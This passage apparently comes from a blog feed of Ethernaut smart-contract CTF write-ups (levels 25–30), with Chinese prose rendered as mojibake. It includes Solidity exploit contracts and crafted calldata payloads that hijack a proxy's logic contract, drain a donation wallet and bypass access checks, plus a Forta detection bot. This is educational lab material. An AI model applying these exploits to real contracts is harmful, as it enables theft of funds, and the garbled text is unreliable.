class="string">&#x27;0x0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check balance of contract, shoule be zero</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balances</span>(instance)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// change `admin` in PuzzleProxy</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setMaxBalance</span>(player);</span><br></pre></td></tr></table></figure>
<h2 id="motorbike">25 Motorbike</h2>
<p>è¿™é“é¢˜ä½¿ç”¨äº† ERC1967 ï¼ŒERC1967
æä¾›äº†ä¸€ç§ä¸æ”¹å˜åˆçº¦åœ°å€è€Œå‡çº§åˆçº¦çš„æ ‡å‡†æ–¹å¼ã€‚è€Œåœ¨ ERC1967
ä¸­ç‰µæ‰¯åˆ°äº†ä¸¤ç§åˆçº¦ï¼šä»£ç†åˆçº¦ä¸é€»è¾‘åˆçº¦ã€‚</p>
<p>ä»£ç†åˆçº¦çš„ä½œç”¨æ˜¯ä¿æŒåˆçº¦åœ°å€ä¸å˜ï¼ŒåŒæ—¶é€šè¿‡æ›´æ–° _IMPLEMENTATION_SLOT
ä¸­çš„åœ°å€æ¥æ”¹å˜å…¶æŒ‡å‘çš„é€»è¾‘åˆçº¦ï¼Œå®ç°åˆçº¦çš„å‡çº§ã€‚åœ¨æœ¬é¢˜ä¸­ï¼ŒMotorbike
æ˜¯ä»£ç†åˆçº¦ï¼ˆproxy contractï¼‰ï¼Œå®ƒåœ¨ constructor
å‡½æ•°ä¸­è®¾ç½®äº†é€»è¾‘åˆçº¦çš„åœ°å€ï¼Œå¹¶å°†é€»è¾‘åˆçº¦åˆå§‹åŒ–ï¼›è¿˜åœ¨ fallback
å‡½æ•°ä¸­æ•è·æ‰€æœ‰ä¸åˆçº¦æ¥å£ä¸åŒ¹é…çš„è°ƒç”¨ï¼Œå¹¶ç§»äº¤ç»™ logic åˆçº¦å»å¤„ç†ã€‚è€Œ
engine æ˜¯é€»è¾‘åˆçº¦ï¼ˆimplementation/logic contractï¼‰ã€‚</p>
<p>ä»¥ä¸Šæ˜¯åŸºç¡€çŸ¥è¯†ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™é“é¢˜è¯¥æ€ä¹ˆåšã€‚</p>
<p>é¦–å…ˆï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬ selfdestruct æ‰ engine è¿™ä¸ªåˆçº¦ï¼Œè€Œ engine
åˆçº¦ä¸­å¹¶æ²¡æœ‰ selfdestruct è¿™ä¸ªå‡½æ•°ã€‚ä½†é€šè¿‡é˜…è¯»ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œengine
åˆçº¦åœ¨ _upgradeToAndCall å‡½æ•°ä¸­è°ƒç”¨äº† â€œå‡çº§åçš„åˆçº¦åœ°å€çš„ data
è¿™ä¸€å‡½æ•°é€‰æ‹©å™¨ä»£è¡¨çš„å‡½æ•°â€ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æŠŠå‡çº§åçš„åˆçº¦åœ°å€æŒ‡å‘æˆ‘ä»¬çš„æ¶æ„åˆçº¦
evilï¼Œç„¶ååœ¨ evil ä¸­è®¾ç½® selfdestructï¼Œé‚£ä¹ˆå°±å¯ä»¥è¾¾æˆæˆ‘ä»¬çš„ç›®çš„äº†ã€‚</p>
<p>ä½†é¢˜ç›®è¿˜è®¾ç½®äº†ä¸€æ¡é˜²çº¿ï¼šè°ƒç”¨ upgradeToAndCall çš„ç”¨æˆ·å¿…é¡»æ˜¯
upgraderï¼Œè€Œ motorbike åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°±å·²ç»è°ƒç”¨è¿‡ä¸€æ¬¡ initialize äº†ï¼Œè€Œ
initializer è¿™ä¸ªmodifier
é™å®šäº†è¿™ä¸ªåˆå§‹åŒ–å‡½æ•°åªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡ã€‚çœ‹èµ·æ¥æˆ‘ä»¬æ²¡æœ‰åŠæ³•æ”¹å˜
upgraderäº†ã€‚</p>
<p>ä½†å®é™…ä¸Šï¼Œproxy contractçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œinitialize
å‡½æ•°ç¡®å®å·²ç»è¢«è°ƒç”¨è¿‡äº†ï¼Œä½†åœ¨ engine è¿™ä¸ª logic contract
çš„ä¸Šä¸‹æ–‡ä¸­å¹¶æ²¡æœ‰è¢«è°ƒç”¨è¿‡ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰¾åˆ° engine
çš„åˆçº¦åœ°å€ï¼Œç„¶åä¸»åŠ¨è°ƒç”¨ initialize å‡½æ•°ã€‚</p>
<p>exp å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Engine &#123;</span><br><span class="line">    function initialize() external;</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    Engine private engine;</span><br><span class="line"></span><br><span class="line">    constructor(address target) &#123;</span><br><span class="line">        engine = Engine(target);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function hack() external &#123;</span><br><span class="line">        engine.initialize();</span><br><span class="line">        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destruct() external &#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†è¿™é“é¢˜è²Œä¼¼ç°åœ¨å‡ºäº†äº›è®¤è¯é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<a
href="https://sepolia.etherscan.io/address/0x5f32626248fc2a2af86c775bfd9a2e7b8b2f2a4d#internaltx">etherscan</a>ä¸Šçœ‹åˆ°è¿™ä¸ªåˆäºç¡®å®è°ƒç”¨äº†è‡ªæ¯å‡½æ•°ï¼Œä½†å¥½åƒæ²¡æœ‰æ‰§è¡Œè‡ªä¼šï¼Œå› æ­¤ä»ç„¶æäº¤ä¸é€šè¿‡..</p>
<h2 id="doubleentrypoint">26 DoubleEntryPoint</h2>
<p>è¿™é“é¢˜çš„ä¸»è¦åˆçº¦ä¸º DoubleEntryPointï¼ˆç®€ç§°DEPï¼‰ï¼Œè¯¥åˆçº¦æŒæœ‰ DET
è¿™ç§ä»£å¸ï¼ŒåŒæ—¶è®¾è®¡äº† CryptoVault è¿™ä¸ªåˆçº¦ç”¨æ¥ç®¡ç† DET ä»£å¸ï¼Œåœ¨
CryptoVault ä¸­ç”¨æˆ·å¯ä»¥æ¸…ç†èµ°åˆçº¦ä¸­çš„é underlying ä»£å¸ï¼ˆunderlying
ä»£å¸ä¹Ÿæ˜¯åˆçº¦è‡ªå®šä¹‰çš„ï¼Œæ˜¯ç”¨æ¥ç»´æŠ¤åˆçº¦çš„ã€ä¸å¯æ¸…ç†çš„ä»£å¸ï¼‰ã€‚è€Œæœ¬é¢˜ç›®æƒ³è®©æˆ‘ä»¬åˆ©ç”¨<code>Forta</code>æ¥ç›‘æ§
DEP çš„è¡Œä¸ºï¼Œé˜²æ­¢ underlying ä»£å¸è¢«æ¸…ç†ï¼Œä»è€Œå¯¼è‡´åˆçº¦ä¸å¯ç”¨ã€‚</p>
<p>å½“æˆ‘ä»¬è°ƒç”¨ sweepToken(LGT_address) æ—¶ï¼ŒsweepToken ä¼šè°ƒç”¨
LegacyToken.transferï¼Œ</p>
<p>è€Œæ­¤æ—¶ LegacyToken.delegate å·²ç»è¢«è®¾ç½®ä¸ºäº† DEP åˆçº¦çš„å®ä¾‹åœ°å€ï¼Œå› æ­¤
LegacyToken.transfer ä¼šè°ƒç”¨ DEP.delegateTransfer(sweptTokensRecipient,
token.balanceOf(CryptoVault.address), CryptoVault.address)ï¼Œ</p>
<p>æ­¤æ—¶å¦‚æœ CryptoVault ä¸­å­˜åœ¨
DETï¼Œå°±ä¼šè¢«å…¨æ•°è½¬èµ°ã€‚è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„â€œä»£å¸åŒé‡å…¥å£â€æ¼æ´ï¼Œå³é€šè¿‡æ“çºµä¸€ä¸ªä»£å¸çš„è½¬è´¦é€»è¾‘é—´æ¥å½±å“å¦ä¸€ä¸ªä»£å¸çš„è¡Œä¸ºã€‚</p>
<p>é˜²å¾¡èµ·æ¥ä¹Ÿå¾ˆç®€å•ï¼Œåªè¦è®© DEP ä¸­çš„ delegateTransfer çš„ origSender
ä¸è¦æ˜¯ CryptoVault å°±å¥½äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AlertBot is IDetectionBot &#123;</span><br><span class="line">    address private cryptoVault;</span><br><span class="line">    IForta iforta;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        cryptoVault = 0xe0B40efa39E4B61a9141AFbe95B54a113A1000CE;</span><br><span class="line">        iforta = IForta(0xb76adbE51242C49306D9C9EB929F8f3E508c5f82);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">        address origSender;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            origSender := calldataload(0xa8)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(origSender == cryptoVault) &#123;</span><br><span class="line">            IForta(msg.sender).raiseAlert(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="good-samaritan">27 Good Samaritan</h2>
<p>è¿™ä¸ªåˆçº¦æ˜¯ä¸€ä¸ªâ€œå¥½å¿ƒçš„ Samaritan äººâ€(ç®€ç§° Säºº)æ¨¡æ¿ï¼Œè¿™ä¸ª
Säººæœ‰ä¸€ä¸ªé’±åŒ…å’Œä¸€ç§ä»£å¸ï¼Œå¹¶ä¸”åˆå§‹å°±æœ‰ä¸€ç™¾ä¸‡ä¸ªå¸ã€‚å¹¶ä¸”å¦‚æœä½ é—®ä»–è¦10ä¸ªå¸ï¼Œä»–ä¼šæ— ç§çš„ææ¬¾ç»™ä½ ï¼›å³ä½¿ä»–ä¹Ÿç©·å¾—å“å®å½“äº†ã€ç©·çš„ä¸å¤šäº10ä¸ªå¸ï¼ŒSäººä»ç„¶ä¼šæŠŠè‡ªå·±å‰©ä½™çš„é’±æç»™ä½ ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬æ˜¯æ¶æ„ç”¨æˆ·ï¼Œæƒ³è¦è¯ˆéª—Säººè¿™ä¸€ç™¾ä¸‡ä¸ªå¸ï¼Œä½†å¦‚æœé€šè¿‡donate10æ¥è¯ˆéª—ï¼Œéœ€è¦è°ƒç”¨åä¸‡æ¬¡requestDonationï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æƒ³ä¸€ä¸ªèµ°
catch é€”å¾„çš„æ–¹å¼ã€‚</p>
<p>åªéœ€è¦å®ç° INotifyable æ¥å£, ç„¶ååœ¨ amount ç­‰äº 10 çš„æ—¶å€™ revert
NotEnoughBalance error, è¿™æ · GoodSamaritan å°±ä¼šå†è§¦å‘ä¸€æ¬¡è½¬è´¦,
å°†é’±åŒ…å†…æ‰€æœ‰çš„é’±è½¬èµ°ã€‚</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">error NotEnoughBalance();</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface GoodSamaritan &#123;</span><br><span class="line">    function requestDonation() external returns (bool enoughBalance);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack is INotifyable &#123;</span><br><span class="line">    address target = 0xed5Ad44F9274b4be60e2c017FB72be94a8D1857D;</span><br><span class="line">    GoodSamaritan gs;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        gs = GoodSamaritan(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        gs.requestDonation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function notify(uint256 amount) pure external &#123;</span><br><span class="line">        if(amount == 10) &#123;</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="gatekeeper-three">28 GateKeeper Three</h2>
<p>é¦–å…ˆæˆ‘ä»¬å‘ç°è¿™ä¸ªæ„é€ å‡½æ•° construct0r
å±…ç„¶å†™é”™äº†ï¼Œå¹¶ä¸”è¿˜ç”¨çš„publicï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸ª evilContract è°ƒç”¨ä¸€ä¸‹
construct0r å°±èƒ½å°† owner è®¾ç½®æˆ evilContract çš„åœ°å€ã€‚</p>
<p>GateOne è¦æ±‚è°ƒç”¨è€…æ˜¯ ownerï¼Œä½†æºå¤´ä¸æ˜¯ownerã€‚å¾ˆç®€å•ï¼Œæˆ‘ä»¬é€šè¿‡
evilContract æ“ä½œå³å¯ã€‚</p>
<p>GateTwo è¦æ±‚ allowEntrance ä¸º trueã€‚åªè¦ createTrick ä¸ getAllowance
åœ¨åŒä¸€æ¬¡ functionï¼ˆäº¤æ˜“ï¼‰ å†…æ‰§è¡Œï¼Œblock.timestamp å°±æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>GateThree è¦æ±‚è¯¥åˆçº¦è¶…è¿‡ 0.001 etherï¼Œå¹¶ä¸”å‘ç»™ evilContract 0.001
ether å¤±è´¥ã€‚</p>
<p>exp å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperThree &#123;</span><br><span class="line">    function construct0r() external;</span><br><span class="line">    function createTrick() external;</span><br><span class="line">    function getAllowance(uint256 _password) external;</span><br><span class="line">    function enter() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract evilContract &#123;</span><br><span class="line">    address target = 0x85bBddCADB43AB650d91eb9658681aD70c721407;</span><br><span class="line">    GatekeeperThree victim;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        victim = GatekeeperThree(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() payable external &#123;</span><br><span class="line">        require(msg.value &gt; 0.001 ether);</span><br><span class="line">        // gateOne</span><br><span class="line">        victim.construct0r();</span><br><span class="line"></span><br><span class="line">        // gateTwo</span><br><span class="line">        victim.createTrick();</span><br><span class="line">        victim.getAllowance(block.timestamp);</span><br><span class="line"></span><br><span class="line">        // gateThree</span><br><span class="line">        payable(address(victim)).transfer(msg.value);</span><br><span class="line">        </span><br><span class="line">        // hack</span><br><span class="line">        victim.enter();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="switch">29 Switch</h2>
<p>è¿™é“é¢˜è¦æ±‚æˆ‘ä»¬æŒæ¡ CALLDATA æ˜¯å¦‚ä½•ç¼–ç çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å…ˆæ¥æ¶è¡¥ä¸€ä¸‹
calldata çš„çŸ¥è¯†ã€‚</p>
<p>å½“åˆçº¦Aè°ƒç”¨åˆçº¦Bï¼Œè¿™æ¡è°ƒç”¨ä¿¡æ¯ä¼šè¢«æ‰“åŒ…æˆä¸€æ¡äº¤æ˜“ä¿¡æ¯ï¼Œå¹¿æ’­ç»™åŒºå—é“¾ä¸Šçš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œå¹¶æ”¾å…¥è¿™äº›èŠ‚ç‚¹çš„äº¤æ˜“æ± ä¸­ï¼›å½“å‰ä¸€ä¸ªåŒºå—éªŒè¯/æŒ–æ˜å®Œæ¯•ï¼Œæ‰€æœ‰èŠ‚ç‚¹ä¼šé€‰æ‹©è‡ªå·±æ± ä¸­çš„ä¸€ç»„äº¤æ˜“ä¿¡æ¯ï¼Œåˆæ­¥éªŒè¯gasã€ä½™é¢ç­‰ä¿¡æ¯åç”Ÿæˆä¸€ä¸ªå€™é€‰blockï¼Œåœ¨ç”Ÿæˆå€™é€‰åŒºå—çš„åŒæ—¶ï¼ŒèŠ‚ç‚¹ä¼šå¯åŠ¨EVMæ‰§è¡Œäº¤æ˜“ï¼›å½“æ»¡è¶³PoWåï¼ŒèŠ‚ç‚¹ä¼šå¹¿æ’­è‡ªå·±çš„å€™é€‰åŒºå—è®©å…¶ä»–äººéªŒè¯ï¼›</p>
<p>è€Œåˆçº¦Aè°ƒç”¨Bæ—¶ï¼ŒAä¼šæ„å»º CALLDATAï¼Œè€ŒBåˆ™é€šè¿‡ CALLDATA æ¥åˆ¤æ–­ A
è°ƒç”¨äº†è‡ªå·±çš„å“ªä¸€ä¸ª functionã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬å·²ç»äº†è§£äº† CALLDATA
çš„åº”ç”¨åœºæ™¯ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸‹å®ƒé•¿ä»€ä¹ˆæ ·å­ï¼ˆç¼–ç æ–¹å¼ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xbabecafe  -&gt;  (keccak(function))[:4]</span><br><span class="line">00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000  -&gt;  å…¶ä»–æ•°æ®</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼ŒCALLDATA
ç”±å››å­—èŠ‚çš„å‡½æ•°ç­¾åå’Œæ•°æ®ç»„æˆï¼Œå…·ä½“æ€ä¹ˆç¼–ç å¯ä»¥çœ‹<a
href="https://cylab.be/blog/334/solidity-abi-encoding-explained">è¿™ç¯‡</a></p>
<p>å›åˆ°è¿™é“é¢˜ï¼Œæˆ‘ä»¬è‚¯å®šæ˜¯éœ€è¦è°ƒç”¨ <code>turnSwitchOn</code>
æ¥æ‰“å¼€å¼€å…³ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°é™å®šäº†
onlythisï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦è®©ç›®æ ‡åˆçº¦è‡ªå·±è°ƒç”¨ turnSwitchOn</p>
<p>å¯ä»¥çœ‹åˆ° <code>flipSwitch</code> æœ‰è‡ªå·±è°ƒç”¨è‡ªå·±çš„ call
å‘½ä»¤ï¼Œä½†æ˜¯éœ€è¦ç»•è¿‡ä¸€äº› modifier</p>
<p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™å‡ ä¸ªå‡½æ•°çš„ç­¾åï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;turnSwitchOff()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x20606e15b70f0894e0e83ae9593ae406a94abb5adcfcf0d169c6784f02198dc3&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;turnSwitchOn()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x76227e12b0f9524a1cdf8423a63057ea998f18f618846d452f0caf8339009449&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;flipSwitch(bytes)&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x30c13adec91872243f797e6f9ca682ad108854e1f771ca6bee08c6550c7198d7&#x27;</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¸Œæœ›è°ƒç”¨ <code>flipSwitch</code>
å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬ä¼šå…ˆåœ¨å¤´éƒ¨å››å­—èŠ‚å†™ä¸‹<code>0x30c13ade</code>ï¼Œç„¶åå› ä¸º
bytes æ˜¯åŠ¨æ€å˜é‡ï¼Œå› æ­¤æˆ‘ä»¬ä¼šç”¨ 32 å­—èŠ‚æ¥è®°å½• offsetï¼Œ32å­—èŠ‚è®°å½•
lengthï¼Œç„¶åæ˜¯å®é™… data</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30c13ade</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000020 &lt;- offset</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000length &lt;- length</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &lt;- å®é™… data</span><br></pre></td></tr></table></figure>
<p>æ¥ç€æˆ‘ä»¬å¸Œæœ›è°ƒç”¨ <code>turnSwitchOn</code> å‡½æ•°ï¼Œæ‰€ä»¥å®é™… data
å¤„æˆ‘ä»¬å¸Œæœ›æ˜¯ turnSwitchOn çš„æ ‡è¯†ç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30c13ade</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000020 &lt;- offset</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000004 &lt;- length </span><br><span class="line">76227e1200000000000000000000000000000000000000000000000000000000 &lt;- å®é™… data</span><br></pre></td></tr></table></figure>
<p>ä½† filpSwtich è¢« onlyOff
ä¿®é¥°äº†ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸ªä¿®é¥°ç¬¦ã€‚è€Œè¿™ä¸ªä¿®é¥°ç¬¦ä¸­ä½¿ç”¨
calldatacopy(t,s,f)ï¼Œå°† offset = s å¤„çš„ f ä¸ªå­—èŠ‚æ‹·è´åˆ° t åœ°å€å¤„ã€‚è€Œ
<code>calldatacopy(selector, 68, 4)</code> æ­£å¥½æ˜¯æˆ‘ä»¬ç°åœ¨ 76227e12
çš„ä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦åœ¨è¿™å†™ä¸‹ keccak256("turnSwitchOff()") ä¹Ÿå°±æ˜¯
20606e15</p>
<p>ä¹‹åï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹offsetå°±èƒ½æ”¹å˜dataçš„ä½ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30c13ade</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000060 &lt;- offset</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 &lt;- padding </span><br><span class="line">20606e1500000000000000000000000000000000000000000000000000000000 &lt;- bypass</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000004 &lt;- length</span><br><span class="line">76227e1200000000000000000000000000000000000000000000000000000000 &lt;- å®é™… data</span><br></pre></td></tr></table></figure>
<p>expå¦‚ä¸‹</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="higherorder">30 HigherOrder</h2>
<p>è·Ÿä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œä¹Ÿæ˜¯ calldata å¯ä»¥è¢«æˆ‘ä»¬äººä¸ºæ“æ§è¿›è€Œè¾¾æˆä¸€äº›ç›®çš„</p>
<p>soliditylang ä¸Šä¸¤ä¸ª Yul å‡½æ•°çš„ä»‹ç»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sstore(p, v)     storage[p] := v</span><br><span class="line">calldataload(p)  ä»ä½ç½®på¼€å§‹çš„è°ƒç”¨æ•°æ®ï¼ˆ32å­—èŠ‚ï¼‰</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;registerTreasury(uint8)&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x211c85abbbaf9884d77268c011d56de0d4b5e816ac06c84275c1aadd7eab81c5&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;claimLeadership()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x5b3e8fe738d49181e7fc102771232e813fa1ae1daa69c894601a0170e188ff95&#x27;</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æˆ‘ä»¬æ„é€ dataä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x211c85ab</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000100</span><br></pre></td></tr></table></figure>
<p>å°±å¯ä»¥ç»•è¿‡ treasury &gt; 255 çš„æ£€æµ‹äº†ã€‚</p>
<p>ç„¶åè°ƒç”¨ claimLeadership å°±è¡Œäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5b3e8fe7</span><br></pre></td></tr></table></figure>
<p>exp å¦‚ä¸‹</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;0x211c85ab0000000000000000000000000000000000000000000000000000000000000100&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;0x5b3e8fe7&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="section">31</h2>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchain - 2024åˆçº¦æ¼æ´ç±»å‹æ±‡æ€»ï¼ˆæ›´æ–°ä¸­ï¼‰</title>
    <url>/2024/08/20/blockchain%20-%202024%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB%EF%BC%88%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
æ±‡æ€»ä¸€ä¸‹è¿„ä»Šä¸ºæ­¢æ‰€æœ‰çš„æ™ºèƒ½åˆçº¦æ¼æ´
</blockquote>
<span id="more"></span>
<p>æŒ‰ç…§ 2023 å¹´çš„è¿™ç¯‡ A survey on smart contract vulnerabilities Data
sources, detection and repairï¼Œå°†æ¼æ´ç±»å‹åˆ†ä¸ºä¸‰ç±»ï¼šsolidity
è¯­è¨€æ¼æ´ã€EVMæ¼æ´å’ŒåŒºå—é“¾æ¼æ´</p>
<h1 id="æœ¯è¯­è§„èŒƒ">[0] æœ¯è¯­è§„èŒƒ</h1>
<p>ç”±äºä¸­è‹±äº’è¯‘å¸¦æ¥çš„ä¸€ç³»åˆ—é—®é¢˜ï¼Œç¬”è€…åœ¨æœ¬å¤„è§„èŒƒä¸€äº›æœ¯è¯­çš„å¸¸è§ç”¨æ³•ï¼Œä¾¿äºè¯»è€…æŸ¥çœ‹ã€‚</p>
<ul>
<li><p>è¢«æ”»å‡»åˆçº¦ Victim</p></li>
<li><p>æ”»å‡»åˆçº¦ Attacker</p></li>
</ul>
<h1 id="solidity-è¯­è¨€æ¼æ´">[1] solidity è¯­è¨€æ¼æ´</h1>
<h2 id="re-entrancy">[1-1] Re-entrancy</h2>
<h3 id="åŸç†">åŸç†</h3>
<p>ä»æœ€è‘—åçš„é‡å…¥æ”»å‡»å¼€å§‹ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆé“ºå«ä¸€äº›åŸºç¡€çŸ¥è¯†ã€‚ä»»ä½•åˆçº¦å¦‚æœè¦åœ¨éƒ¨ç½²åæ¥æ”¶ä»¥å¤ªå¸ï¼Œéƒ½ä¼šè°ƒç”¨
